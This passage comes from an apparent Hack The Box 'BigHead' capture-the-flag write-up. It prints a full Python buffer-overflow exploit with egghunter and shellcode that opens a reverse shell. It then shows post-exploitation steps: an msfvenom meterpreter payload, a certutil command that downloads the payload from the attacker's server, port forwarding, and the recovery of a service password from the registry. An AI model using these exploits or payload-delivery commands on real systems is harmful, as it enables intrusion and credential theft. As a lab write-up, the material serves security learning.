<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>
<p><br> Last thing to do is to send the POST request with the shellcode :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"POST / HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Host: dev.bighead.htb</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Content-Length: </span><span class="si">%</span><span class="s">s</span><span class="se">\r\n</span><span class="s">"</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="o">+</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>
<p><br> Then we will close the stream : <code class="highlighter-rouge">s.close()</code>
<br> I added this in a <code class="highlighter-rouge">for</code> loop to send the shellcode 16 times. I did this because I wanted to put the shellcode in different places so the egghunter finds it easily. I also added a print statement at the start of the function : <code class="highlighter-rouge">print "\033[32m [*] Sending Shellcode"</code>, <code class="highlighter-rouge">\033[32m</code> is for the color it’s not important for the exploit. And I added a print statement before closing the stream : <code class="highlighter-rouge">print '\033[34m' + '[' + str(N) + '] ' + re.sub(r"\s"," ",s.recv(12))</code>. <code class="highlighter-rouge">re.sub(r"\s"," ",s.recv(12))</code> This will use <code class="highlighter-rouge">re</code> (regular expressions operations) to print the first 12 chars of the first line of the server response (“HTTP/1.1” + “ “ + status code (3 chars) = 12).
<code class="highlighter-rouge">send_shellcode</code> :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send_shellcode</span><span class="p">(</span><span class="n">N</span><span class="p">,</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egg</span><span class="p">,</span><span class="n">shellcode</span><span class="p">):</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Sending Shellcode"</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">16</span><span class="p">):</span>
		<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
		<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"POST / HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Host: dev.bighead.htb</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Content-Length: </span><span class="si">%</span><span class="s">s</span><span class="se">\r\n</span><span class="s">"</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="o">+</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="k">print</span> <span class="s">'</span><span class="se">\033</span><span class="s">[34m'</span> <span class="o">+</span> <span class="s">'['</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">N</span><span class="p">)</span> <span class="o">+</span> <span class="s">'] '</span> <span class="o">+</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">r"\s"</span><span class="p">,</span><span class="s">" "</span><span class="p">,</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">))</span>
		<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
		<span class="n">N</span> <span class="o">+=</span> <span class="mi">1</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Done"</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/80.png" alt=""><br>
<br> That’s for <code class="highlighter-rouge">send_shellcode</code>, let’s write <code class="highlighter-rouge">send_egghunter</code>. We will define the function first :
<br><code class="highlighter-rouge">def send_egghunter(host,port,egghunter):</code>
<br> Then we will open a TCP stream socket to the server and the port and hold it in a variable called <code class="highlighter-rouge">s</code> :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>
<p><br> Then we will connect and send the HEAD request :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
<span class="n">s</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="bp">None</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"HEAD /"</span> <span class="o">+</span> <span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">72</span><span class="p">)</span> <span class="o">+</span> <span class="s">"f0125062"</span> <span class="o">+</span> <span class="n">egghunter</span> <span class="o">+</span> <span class="s">" HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Host: dev.bighead.htb</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>
<p><br> I did <code class="highlighter-rouge">settimeout(None)</code> as the server takes a lot of time to respond to this request (Because we will change the code flow so the server won’t reply) and we don’t want the stream to be closed before our egghunter is successfully executed.
<br> <code class="highlighter-rouge">s.send("HEAD /" + ("A"*72) + "f0125062" + egghunter + " HTTP/1.1\r\n")</code> This line sends 72 A’s then <code class="highlighter-rouge">f0125062</code> (jmp esp (new EIP)) then the egghunter. 
<code class="highlighter-rouge">send_egghunter</code> :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send_egghunter</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egghunter</span><span class="p">):</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Sending EggHunter"</span>
	<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
	<span class="n">s</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="bp">None</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"HEAD /"</span> <span class="o">+</span> <span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">72</span><span class="p">)</span> <span class="o">+</span> <span class="s">"f0125062"</span> <span class="o">+</span> <span class="n">egghunter</span> <span class="o">+</span> <span class="s">" HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Host: dev.bighead.htb</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
	<span class="k">print</span> <span class="s">'</span><span class="se">\033</span><span class="s">[34m'</span> <span class="o">+</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">r"\s"</span><span class="p">,</span><span class="s">" "</span><span class="p">,</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">))</span>
	<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Done"</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/81.png" alt=""><br>
<br> The exploit is ready, we just need to call the functions :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">send_shellcode</span><span class="p">(</span><span class="n">N</span><span class="p">,</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egg</span><span class="p">,</span><span class="n">shellcode</span><span class="p">)</span>
<span class="n">send_egghunter</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egghunter</span><span class="p">)</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/82.png" alt=""><br>
<br> Final Exploit :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">'10.10.10.112'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<span class="n">egg</span> <span class="o">=</span> <span class="s">'R1ck'</span>

<span class="n">N</span> <span class="o">=</span> <span class="mi">0</span>

<span class="n">buf</span> <span class="o">=</span>  <span class="s">""</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"d9c7d97424f45a2bc9bb9f0948"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3bb15283c204315a1303c51aaa"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"ce05f4a831f505cdb81034cddf"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"5167fd94378476f8a31ffad5c4"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"a8b103eb29e9706aaaf0a44c93"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3ab98dd42730df8d2ce7cfba79"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3464f06c3c99418e6d0cd9c9ad"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"af0e62e4b7534fbe4ca73b4184"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"f9c4eee93537ee2ef1a8854601"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"549e9d7b822b05db418be1dd86"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"4a62d163182cf672cd4702fef0"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"878244d703ce1f7612aace8744"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"15ae2d0fb8bb5f52d508526c25"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"07e51f17885db71b4178405b78"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3cdea2833df760d76d6f4058e6"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"6f6d8da93fc17e0aefa12ee2e5"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"2d101206e439b9fd6f4c34ee74"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"384a108e81c3f6fae185a19298"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"8f3902641a4404eea9b9cb07c7"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"a9bce792936bf708bbf06ad73b"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"7e97406cd76999f8c5d0331e14"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"847c9ac375822381c2a0335fca"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"ec670f9dbad1e9770d8ba324c7"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"5b3507d81d3a42aec18b3bf7fe"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"24acff87584cff52d97c4afe48"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"15136bc978a4460e852762ef72"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3707ea3ffff486506afa3550bf"</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="n">egg</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<span class="n">egghunter</span> <span class="o">=</span> <span class="s">"6681caff0f42526a0258cd2e3c055a74efb8"</span> <span class="o">+</span> <span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">egg</span><span class="p">)</span> <span class="o">+</span> <span class="s">"8bfaaf75eaaf75e7ffe7"</span>

<span class="k">def</span> <span class="nf">send_shellcode</span><span class="p">(</span><span class="n">N</span><span class="p">,</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egg</span><span class="p">,</span><span class="n">shellcode</span><span class="p">):</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Sending Shellcode"</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">16</span><span class="p">):</span>
		<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
		<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"POST / HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Host: dev.bighead.htb</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Content-Length: </span><span class="si">%</span><span class="s">s</span><span class="se">\r\n</span><span class="s">"</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="o">+</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="k">print</span> <span class="s">'</span><span class="se">\033</span><span class="s">[34m'</span> <span class="o">+</span> <span class="s">'['</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">N</span><span class="p">)</span> <span class="o">+</span> <span class="s">'] '</span> <span class="o">+</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">r"\s"</span><span class="p">,</span><span class="s">" "</span><span class="p">,</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">))</span>
		<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
		<span class="n">N</span> <span class="o">+=</span> <span class="mi">1</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Done"</span>

<span class="k">def</span> <span class="nf">send_egghunter</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egghunter</span><span class="p">):</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Sending EggHunter"</span>
	<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
	<span class="n">s</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="bp">None</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"HEAD /"</span> <span class="o">+</span> <span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">72</span><span class="p">)</span> <span class="o">+</span> <span class="s">"f0125062"</span> <span class="o">+</span> <span class="n">egghunter</span> <span class="o">+</span> <span class="s">" HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Host: dev.bighead.htb</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
	<span class="k">print</span> <span class="s">'</span><span class="se">\033</span><span class="s">[34m'</span> <span class="o">+</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">r"\s"</span><span class="p">,</span><span class="s">" "</span><span class="p">,</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">))</span>
	<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Done"</span>

<span class="n">send_shellcode</span><span class="p">(</span><span class="n">N</span><span class="p">,</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egg</span><span class="p">,</span><span class="n">shellcode</span><span class="p">)</span>
<span class="n">send_egghunter</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egghunter</span><span class="p">)</span>
</code></pre></div></div>
<p><br> Now it’s show time, Let’s test the exploit :
<br><img src="/images/hackthebox/bighead/83.png" alt=""><br>
<br> Perfectly working ! we got a reverse shell.
<br></p>
<hr>

<h2 id="enumeration-enumeration-enumeration-">Enumeration, Enumeration, Enumeration …</h2>
<p><br><img src="/images/hackthebox/bighead/84.png" alt=""><br>
<br> We are on the machine as <code class="highlighter-rouge">nelson</code>, There is another user on the box called <code class="highlighter-rouge">nginx</code> :
<br><img src="/images/hackthebox/bighead/85.png" alt=""><br>
<br> I checked <code class="highlighter-rouge">C:\Users\Nelson</code> and <code class="highlighter-rouge">C:\Users\Nelson\Desktop</code> and I found the user flag :
<br><img src="/images/hackthebox/bighead/86.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/87.png" alt=""><br>
<br> 2962 bytes? Well … no it’s not the user flag :
<br><img src="/images/hackthebox/bighead/88.png" alt=""><br>
<br> So we probably we need to be <code class="highlighter-rouge">nginx</code> to get the user flag. And of course we can’t access <code class="highlighter-rouge">nginx</code> directory :
<br><img src="/images/hackthebox/bighead/89.png" alt=""><br>
<br> I wanted to upgrade that reverse shell into <code class="highlighter-rouge">meterpreter</code> so I had to create the payload first :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.xx.xx LPORT=1338 -f exe &gt; m.exe
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/90.png" alt=""><br>
<br> Then I set up the <code class="highlighter-rouge">meterpreter</code> handler :
<br><img src="/images/hackthebox/bighead/91.png" alt=""><br>
<br> I ran a python simple http server on port 80 : <code class="highlighter-rouge">python -m SimpleHTTPServer 80</code> to host the payload. Then I went to <code class="highlighter-rouge">C:\Users\Nelson\AppData\Local\Temp</code> and downloaded the payload with <code class="highlighter-rouge">certutil</code> :
<br><code class="highlighter-rouge">certutil -urlcache -split -f http://10.10.xx.xx/m.exe m.exe</code>
<br><img src="/images/hackthebox/bighead/92.png" alt=""><br>
<br> Then I executed it and got a <code class="highlighter-rouge">meterpreter</code> session :
<br><img src="/images/hackthebox/bighead/93.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/94.png" alt=""><br>
<br> From <code class="highlighter-rouge">meterpreter</code> I wanted to look at the services so I did <code class="highlighter-rouge">ps</code>, I looked through them and found an interesting service called <code class="highlighter-rouge">BvSshServer.exe</code>
<br><img src="/images/hackthebox/bighead/95.png" alt=""><br>
<br> I wanted to know the listening port of that ssh server, so I did <code class="highlighter-rouge">netstat</code>. It was listening on port 2020 :
<br><img src="/images/hackthebox/bighead/96.png" alt=""><br>
<br> So I forwarded that port, We also saw earlier when we went to <code class="highlighter-rouge">code.bighead.htb</code> it redirected us to :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:5080/testlink/login.php
</code></pre></div></div>
<p><br>I wanted to forward that port too to check what’s in there. To forward a port through <code class="highlighter-rouge">meterpreter</code> we can simply do it with <code class="highlighter-rouge">portfwd</code> :
<br><code class="highlighter-rouge">portfwd add -l 2020 -p 2020 -r bighead.htb</code>
<br>
<br><code class="highlighter-rouge">portfwd add -l 5080 -p 5080 -r bighead.htb</code>
<br>
<br><img src="/images/hackthebox/bighead/97.png" alt=""><br>
<br> Let’s check if that <code class="highlighter-rouge">BvSshServer</code> is a real ssh server :
<br><img src="/images/hackthebox/bighead/98.png" alt=""><br>
<br> It’s working fine, now we need a password to login. We already know the username : <code class="highlighter-rouge">nginx</code>.
<br> I went to <code class="highlighter-rouge">code.bighead.htb</code> again and after I got redirected to port 5080 on <code class="highlighter-rouge">localhost</code> I got some <code class="highlighter-rouge">SQL</code> errors :
<br><img src="/images/hackthebox/bighead/99.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/100.png" alt=""><br>
<br> As you can see it disclosed the root path  of the application : <code class="highlighter-rouge">C:\xampp</code>. I tried to go there but I got access denied :
<br><img src="/images/hackthebox/bighead/101.png" alt=""><br>
<br> After a lot of enumeration I checked the <code class="highlighter-rouge">registry</code> and in <code class="highlighter-rouge">HKLM\System\CurrentControlSet\Services\</code> I found the <code class="highlighter-rouge">registry</code> for <code class="highlighter-rouge">nignx</code> (The web server) :
<br><code class="highlighter-rouge">reg enumkey -k 'HKLM\System\CurrentControlSet\Services\'</code>
<br><img src="/images/hackthebox/bighead/102.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/103.png" alt=""><br>
<br> Then I looked at the values and I found two interesting ones :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg enumkey -k 'HKLM\System\CurrentControlSet\Services\nginx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/104.png" alt=""><br></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; reg enumkey -k 'HKLM\System\CurrentControlSet\Services\nginx'
Enumerating: HKLM\System\CurrentControlSet\Services\nginx

  Keys (2):

        Parameters
        Enum

  Values (12):

        Type
        Start
        ErrorControl
        ImagePath
        DisplayName
        ObjectName
        Description
        DelayedAutostart
        FailureActionsOnNonCrashFailures
        FailureActions
        Authenticate
        PasswordHash
</code></pre></div></div>
<p><br> <code class="highlighter-rouge">Authenticate</code> and <code class="highlighter-rouge">PasswordHash</code>. Let’s look at the value :
<br> <code class="highlighter-rouge">Authenticate</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v Authenticate
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/105.png" alt=""><br></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v Authenticate
Key: HKLM\System\CurrentControlSet\Services\nginx
Name: Authenticate
Type: REG_BINARY
Data: 4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000
</code></pre></div></div>
<p><br> <code class="highlighter-rouge">PasswordHash</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v PasswordHash
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/106.png" alt=""><br></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v PasswordHash
Key: HKLM\System\CurrentControlSet\Services\nginx
Name: PasswordHash
Type: REG_SZ
Data: 336d72676e6333205361797a205472794861726465722e2e2e203b440a
</code></pre></div></div>
<p><br> <code class="highlighter-rouge">Authenticate</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000
</code></pre></div></div>
<p><br> <code class="highlighter-rouge">PasswordHash</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>336d72676e6333205361797a205472794861726465722e2e2e203b440a
</code></pre></div></div>
<p><br> Looks like <code class="highlighter-rouge">hex</code>, Let’s see <code class="highlighter-rouge">Authenticate</code> : 
<br><img src="/images/hackthebox/bighead/107.png" alt=""><br>
<br> The output was kinda weird, that’s because of the null bytes, I removed them then I got the right output :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4837334270555932557139552d5975677974354659556259302d553837743837
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/108.png" alt=""><br>
<br> So this might be a password : <code class="highlighter-rouge">H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87</code>, Let’s check <code class="highlighter-rouge">PasswordHash</code> :
<br><img src="/images/hackthebox/bighead/109.png" alt=""><br>
<br> <code class="highlighter-rouge">3mrgnc3 sayz TryHarder... ;D</code>, It was just a troll. Anyway we have a password let’s try to login to ssh as <code class="highlighter-rouge">nignx</code> :
<br><img src="/images/hackthebox/bighead/110.png" alt=""><br>
<br> It worked, and by looking at the files I figured out that we are in <code class="highlighter-rouge">C:\xampp</code> :
<br><img src="/images/hackthebox/bighead/111.png" alt=""><br>
<br> There was also a <code class="highlighter-rouge">user.txt</code>, I tried to read it but it said that it was a binary file :
<br><img src="/images/hackthebox/bighead/112.png" alt=""><br>
<br> I wanted to check the user but <code class="highlighter-rouge">whoami</code> wasn’t there :
<br><img src="/images/hackthebox/bighead/113.png" alt=""><br>
<br> So I checked <code class="highlighter-rouge">help</code> and this shell has only some basic commands :
<br><img src="/images/hackthebox/bighead/114.png" alt=""><br>
<br> I know that I’m inside <code class="highlighter-rouge">C:\xampp</code> now. But what am I searching for anyway ? I went back to the <code class="highlighter-rouge">meterpreter</code> shell and checked the access log of <code class="highlighter-rouge">nginx</code> in <code class="highlighter-rouge">C:\nginx\logs</code> :
<br><img src="/images/hackthebox/bighead/115.png" alt=""><br>
<br> At the beginning of the log I found some requests with the <code class="highlighter-rouge">user-agent</code> <code class="highlighter-rouge">3mrgnc3</code> :
<br><img src="/images/hackthebox/bighead/116.png" alt=""><br>
